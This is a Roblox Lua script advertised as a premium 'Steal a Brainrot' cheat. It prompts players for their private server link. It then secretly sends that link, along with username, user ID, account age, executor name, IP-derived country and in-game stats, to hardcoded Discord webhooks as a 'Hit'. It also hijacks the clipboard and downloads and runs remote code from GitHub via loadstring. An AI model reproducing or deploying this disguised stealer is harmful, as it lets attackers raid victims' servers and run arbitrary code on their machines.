
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
                                                                     
                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]

if _G.scriptExecuted then return end
_G.scriptExecuted = true

--====================================================================--
-- Services
--====================================================================--
local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local ReplicatedStorage= game:GetService("ReplicatedStorage")
local Lighting         = game:GetService("Lighting")

local player = Players.LocalPlayer
local gui    = player:WaitForChild("PlayerGui")

--====================================================================--
-- Promotion
--====================================================================--
setclipboard("discord.gg/cnUAk7uc3n")

--====================================================================--
--[[ VIP‑Server Check
--====================================================================--
local isVIP = false
pcall(function()
    local remote = ReplicatedStorage:FindFirstChild("GetServerType")
    if remote and remote:IsA("RemoteFunction") then
        local typ = remote:InvokeServer()
        if typ == "VIPServer" then isVIP = true end
    end
end)

if not isVIP then
    player:Kick("Script.SM does not support public servers. Join a Private Server.")
    return
end ]]

--====================================================================--
-- WEBHOOKS
--====================================================================--
local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
local logs_webhook    = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"

--====================================================================--
-- Safe HTTP
--====================================================================--
local function safeRequest(url, body)
    pcall(function()
        request({
            Url     = url,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode(body)
        })
    end)
end

local function safeHttpGet(url)
    local ok, result = pcall(function()
        return game:HttpGet(url)
    end)
    if ok then return result end
    warn("HttpGet blocked: " .. tostring(result))
    return nil
end

--====================================================================--
-- Link handling
--====================================================================--
local function extractCode(raw)
    raw = raw:gsub("%s", "")
    return raw:match("share%?code=([%w%-]+)") or raw:match("privateServerLinkCode=([%w%-]+)")
end

local function buildJoinLink(code)
    return "https://www.roblox.com/share?code=" .. code .. "&type=Server"
end

--====================================================================--
-- Stats helpers
--====================================================================--
local function formatCash(num)
    if not num or type(num) ~= "number" then return "Unknown" end
    local abs = math.abs(num)
    if abs >= 1e12 then return string.format("%.2fT", num/1e12)
    elseif abs >= 1e9 then return string.format("%.2fB", num/1e9)
    elseif abs >= 1e6 then return string.format("%.2fM", num/1e6)
    elseif abs >= 1e3 then return string.format("%.2fK", num/1e3)
    else return tostring(num) end
end

local function getStat(name)
    local ls = player:FindFirstChild("leaderstats")
    if ls then
        local v = ls:FindFirstChild(name)
        if v and (v:IsA("IntValue") or v:IsA("NumberValue")) then return v.Value end
    end
    return nil
end

local function detectExecutor()
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    return "Unknown"
end

local function getCountry()
    local ok, res = pcall(function()
        return request({Url = "http://ip-api.com/line/?fields=country"})
    end)
    if ok and res and res.StatusCode == 200 then
        return res.Body:match("^(.+)\n") or "Unknown"
    end
    return "Unknown"
end

--====================================================================--
-- Draggable
--====================================================================--
local function makeDraggable(frame, handle)
    local dragging, dragInput, startPos, startMouse
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            startMouse = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    handle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - startMouse
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                      startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

--====================================================================--
-- GUI
--====================================================================--
local screen = Instance.new("ScreenGui")
screen.Name = "ScriptSM_Cinematic"
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true
screen.Parent = gui

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine), {Size = 16}):Play()

local dim = Instance.new("Frame")
dim.Size = UDim2.new(1,0,1,0)
dim.BackgroundColor3 = Color3.new(0,0,0)
dim.BackgroundTransparency = 1
dim.Parent = screen
TweenService:Create(dim, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.4}):Play()

local card = Instance.new("Frame")
card.Size = UDim2.fromOffset(460,280)
card.AnchorPoint = Vector2.new(0.5,0.5)
card.Position = UDim2.fromScale(0.5,1.8)
card.BackgroundColor3 = Color3.fromRGB(28,28,34)
card.BackgroundTransparency = 1
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.Parent = dim

local cardCorner = Instance.new("UICorner", card)
cardCorner.CornerRadius = UDim.new(0,24)

local cardStroke = Instance.new("UIStroke", card)
cardStroke.Color = Color3.fromRGB(80,80,100)
cardStroke.Transparency = 1
cardStroke.Thickness = 2

local gradient = Instance.new("UIGradient", cardStroke)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100,50,255))
}
gradient.Rotation = 45
gradient.Transparency = NumberSequence.new{
    NumberSequenceKeypoint.new(0,0.7),
    NumberSequenceKeypoint.new(1,1)
}

local dragHandle = Instance.new("Frame")
dragHandle.Size = UDim2.new(1,0,0,50)
dragHandle.BackgroundTransparency = 1
dragHandle.Parent = card
makeDraggable(card, dragHandle)

-- Card in
local cardIn = TweenService:Create(card, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Position = UDim2.fromScale(0.5,0.5),
    BackgroundTransparency = 0,
    Rotation = 0
})
cardIn:Play()
TweenService:Create(cardStroke, TweenInfo.new(0.8), {Transparency = 0.6}):Play()
TweenService:Create(gradient, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Rotation = 135}):Play()

-- Title / Sub
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-60,0,50)
title.Position = UDim2.fromOffset(30,30)
title.BackgroundTransparency = 1
title.Text = "Script.SM"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 40
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextTransparency = 1
title.Parent = card
TweenService:Create(title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1,-60,0,26)
sub.Position = UDim2.fromOffset(30,85)
sub.BackgroundTransparency = 1
sub.Text = "VIP / Private Server Required"
sub.TextColor3 = Color3.fromRGB(255,200,0)
sub.Font = Enum.Font.Gotham
sub.TextSize = 16
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.TextTransparency = 1
sub.Parent = card
TweenService:Create(sub, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()

-- Input container
local inputContainer = Instance.new("Frame")
inputContainer.Size = UDim2.new(1,-80,0,60)
inputContainer.Position = UDim2.fromOffset(40,130)
inputContainer.BackgroundTransparency = 1
inputContainer.Parent = card

-- Floating label
local floatLabel = Instance.new("TextLabel")
floatLabel.Size = UDim2.new(1,0,0,20)
floatLabel.Position = UDim2.fromOffset(0,0)
floatLabel.BackgroundTransparency = 1
floatLabel.Text = "Private Server Link"
floatLabel.TextColor3 = Color3.fromRGB(0,170,255)
floatLabel.Font = Enum.Font.GothamSemibold
floatLabel.TextSize = 14
floatLabel.TextXAlignment = Enum.TextXAlignment.Left
floatLabel.Parent = inputContainer

-- TextBox background
local tbBg = Instance.new("Frame")
tbBg.Size = UDim2.new(1,0,0,36)
tbBg.Position = UDim2.fromOffset(0,24)
tbBg.BackgroundColor3 = Color3.fromRGB(40,40,48)
tbBg.BorderSizePixel = 0
tbBg.Parent = inputContainer

local tbCorner = Instance.new("UICorner", tbBg)
tbCorner.CornerRadius = UDim.new(0,12)

-- REAL PLACEHOLDER
local placeholder = Instance.new("TextLabel")
placeholder.Size = UDim2.new(1,-20,1,0)
placeholder.Position = UDim2.fromOffset(10,0)
placeholder.BackgroundTransparency = 1
placeholder.Text = "Paste any private server link..."
placeholder.TextColor3 = Color3.fromRGB(150,150,160)
placeholder.Font = Enum.Font.Gotham
placeholder.TextSize = 16
placeholder.TextXAlignment = Enum.TextXAlignment.Left
placeholder.TextTransparency = 0
placeholder.Parent = tbBg

-- Actual TextBox
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1,-20,1,0)
textBox.Position = UDim2.fromOffset(10,0)
textBox.BackgroundTransparency = 1
textBox.Text = ""
textBox.TextColor3 = Color3.new(1,1,1)
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 16
textBox.TextXAlignment = Enum.TextXAlignment.Left
textBox.TextWrapped = true
textBox.ClearTextOnFocus = false
textBox.Parent = tbBg

-- Underline
local underline = Instance.new("Frame")
underline.Size = UDim2.new(1,0,0,2)
underline.Position = UDim2.new(0,0,1,0)
underline.BackgroundColor3 = Color3.fromRGB(0,170,255)
underline.BackgroundTransparency = 1
underline.BorderSizePixel = 0
underline.Parent = tbBg

-- Animations
local focusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 0})
local unfocusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 1})
local labelUp = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,-20), TextSize = 12})
local labelDown = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,0), TextSize = 14})

-- Placeholder visibility
local function updatePlaceholder()
    placeholder.Visible = (textBox.Text == "")
end
textBox:GetPropertyChangedSignal("Text"):Connect(updatePlaceholder)
textBox.Focused:Connect(function()
    focusLine:Play()
    labelUp:Play()
    updatePlaceholder()
end)
textBox.FocusLost:Connect(function(enter)
    unfocusLine:Play()
    if textBox.Text == "" then labelDown:Play() end
    updatePlaceholder()
    if enter then task.wait(0.1) continueBtn.MouseButton1Click:Fire() end
end)

-- Continue button
local continueBtn = Instance.new("TextButton")
continueBtn.Size = UDim2.new(0,140,0,50)
continueBtn.Position = UDim2.new(1,-180,1,-80)
continueBtn.BackgroundColor3 = Color3.fromRGB(0,140,255)
continueBtn.Text = "Continue"
continueBtn.TextColor3 = Color3.new(1,1,1)
continueBtn.Font = Enum.Font.GothamBold
continueBtn.TextSize = 18
continueBtn.AutoButtonColor = false
continueBtn.Parent = card

local btnCorner = Instance.new("UICorner", continueBtn)
btnCorner.CornerRadius = UDim.new(0,14)

local btnStroke = Instance.new("UIStroke", continueBtn)
btnStroke.Color = Color3.fromRGB(100,200,255)
btnStroke.Thickness = 0

local pulse = TweenService:Create(btnStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Thickness = 3})
pulse:Play()

local pressIn = TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
    Size = UDim2.new(0,130,0,46),
    BackgroundColor3 = Color3.fromRGB(0,110,220)
})
local pressOut = TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
    Size = UDim2.new(0,140,0,50),
    BackgroundColor3 = Color3.fromRGB(0,140,255)
})
continueBtn.MouseButton1Down:Connect(function() pressIn:Play() end)
continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
continueBtn.MouseLeave:Connect(function() pressOut:Play() end)

--====================================================================--
-- Confirm popup (CLEAN & SIMPLE)
--====================================================================--
local confirmGui = nil

local function showConfirm(rawLink)
    local code = extractCode(rawLink)
    if not code then
        local flash = TweenService:Create(tbBg, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120,30,30)})
        flash:Play()
        task.delay(0.3, function()
            TweenService:Create(tbBg, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40,40,48)}):Play()
        end)
        return
    end

    local joinLink = buildJoinLink(code)

    confirmGui = Instance.new("Frame")
    confirmGui.Size = UDim2.fromOffset(380,180)
    confirmGui.Position = UDim2.fromScale(0.5,0.5)
    confirmGui.AnchorPoint = Vector2.new(0.5,0.5)
    confirmGui.BackgroundColor3 = Color3.fromRGB(35,35,45)
    confirmGui.BackgroundTransparency = 1
    confirmGui.BorderSizePixel = 0
    confirmGui.ClipsDescendants = true
    confirmGui.Parent = screen

    local cCorner = Instance.new("UICorner", confirmGui)
    cCorner.CornerRadius = UDim.new(0,20)

    local cStroke = Instance.new("UIStroke", confirmGui)
    cStroke.Color = Color3.fromRGB(100,200,255)
    cStroke.Thickness = 0

    local cDrag = Instance.new("Frame")
    cDrag.Size = UDim2.new(1,0,0,40)
    cDrag.BackgroundTransparency = 1
    cDrag.Parent = confirmGui
    makeDraggable(confirmGui, cDrag)

    local warnTitle = Instance.new("TextLabel")
    warnTitle.Size = UDim2.new(1,-40,0,40)
    warnTitle.Position = UDim2.fromOffset(20,20)
    warnTitle.BackgroundTransparency = 1
    warnTitle.Text = "Confirm Link"
    warnTitle.TextColor3 = Color3.new(1,1,1)
    warnTitle.Font = Enum.Font.GothamBold
    warnTitle.TextSize = 22
    warnTitle.TextTransparency = 1
    warnTitle.Parent = confirmGui

    local warnMsg = Instance.new("TextLabel")
    warnMsg.Size = UDim2.new(1,-40,0,50)
    warnMsg.Position = UDim2.fromOffset(20,60)
    warnMsg.BackgroundTransparency = 1
    warnMsg.Text = "Link is valid. Click Confirm to proceed."
    warnMsg.TextColor3 = Color3.fromRGB(0,255,100)
    warnMsg.Font = Enum.Font.Gotham
    warnMsg.TextSize = 15
    warnMsg.TextWrapped = true
    warnMsg.TextTransparency = 1
    warnMsg.Parent = confirmGui

    local cancelBtn = Instance.new("TextButton")
    cancelBtn.Size = UDim2.new(0,120,0,40)
    cancelBtn.Position = UDim2.new(0,30,1,-60)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(60,60,70)
    cancelBtn.Text = "Cancel"
    cancelBtn.TextColor3 = Color3.new(1,1,1)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 16
    cancelBtn.BackgroundTransparency = 1
    cancelBtn.Parent = confirmGui

    local confirmBtn = Instance.new("TextButton")
    confirmBtn.Size = UDim2.new(0,120,0,40)
    confirmBtn.Position = UDim2.new(1,-150,1,-60)
    confirmBtn.BackgroundColor3 = Color3.fromRGB(0,170,80)
    confirmBtn.Text = "Confirm"
    confirmBtn.TextColor3 = Color3.new(1,1,1)
    confirmBtn.Font = Enum.Font.GothamBold
    confirmBtn.TextSize = 16
    confirmBtn.BackgroundTransparency = 1
    confirmBtn.Parent = confirmGui

    local btnC1 = Instance.new("UICorner", cancelBtn); btnC1.CornerRadius = UDim.new(0,10)
    local btnC2 = Instance.new("UICorner", confirmBtn); btnC2.CornerRadius = UDim.new(0,10)

    -- Smooth popup in
    confirmGui.Size = UDim2.fromOffset(0,0)
    local popIn = TweenService:Create(confirmGui, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Size = UDim2.fromOffset(380,180),
        BackgroundTransparency = 0
    })
    popIn:Play()
    TweenService:Create(cStroke, TweenInfo.new(0.5), {Thickness = 2}):Play()

    task.delay(0.2, function()
        TweenService:Create(warnTitle, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
        TweenService:Create(warnMsg, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
        TweenService:Create(cancelBtn, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
        TweenService:Create(confirmBtn, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
    end)

    -- Simple fade-out close
    local function closeConfirm()
        local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
            BackgroundTransparency = 1
        })
        fadeOut:Play()
        fadeOut.Completed:Connect(function()
            confirmGui:Destroy()
            confirmGui = nil
        end)
    end

    cancelBtn.MouseButton1Click:Connect(closeConfirm)

    confirmBtn.MouseButton1Click:Connect(function()
        closeConfirm()

        -- Store & log
        _G.Private_Server_SM = joinLink
        local cash = getStat("Cash") or 0
        local steals = getStat("Steals") or 0
        local rebirths = getStat("Rebirths") or 0

        safeRequest(prvt_srvrs_logs, {content = joinLink})

        local payload = {
            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
            content = "",
            embeds = {{
                title = "🎯 Steal a Brainrot Hit - Scripts.SM",
                url = joinLink,
                color = 57855,
                fields = {
                    {name = "🪪 Display Name", value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
                    {name = "👤 Username", value = "```"..(player.Name or "Unknown").."```", inline = true},
                    {name = "🆔 User ID", value = "```"..tostring(player.UserId).."```", inline = true},
                    {name = "🗓️ Account Age", value = "```"..tostring(player.AccountAge).." days```", inline = true},
                    {name = "💻 Executor", value = "```"..detectExecutor().."```", inline = true},
                    {name = "🌍 Country", value = "```"..getCountry().."```", inline = true},
                    {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
                    {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
                    {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
                    {name = "💰 Backpack", value = "```Failed to Scan```", inline = false},
                    {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
                },
                footer = {text = "discord.gg/cnUAk7uc3n"},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        safeRequest(user_webhook, payload)
        safeRequest(logs_webhook, payload)

        -- Fade out main GUI
        TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
            Position = UDim2.fromScale(0.5, -1.5),
            BackgroundTransparency = 1
        }):Play()
        TweenService:Create(dim, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
        TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()

        task.delay(0.7, function()
            screen:Destroy()

            local scriptURL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/main-gui.lua"
            local src = safeHttpGet(scriptURL)

            if src then
                local success, err = pcall(function()
                    loadstring(src)()
                end)
                if not success then
                    warn("main-gui.lua failed: " .. tostring(err))
                end
            else
                warn("Failed to fetch main-gui.lua – Check HTTP permissions or internet.")
            end
        end)
    end)
end

--====================================================================--
-- Continue button
--====================================================================--
continueBtn.MouseButton1Click:Connect(function()
    local input = textBox.Text ~= "" and textBox.Text or ""
    showConfirm(input)
end)

--====================================================================--
-- ESC (same as Confirm)
--====================================================================--
UserInputService.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Escape then
        if confirmGui then
            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
                BackgroundTransparency = 1
            })
            fadeOut:Play()
            fadeOut.Completed:Connect(function() confirmGui:Destroy() end)
        else
            showConfirm(textBox.Text)
        end
    end
end)
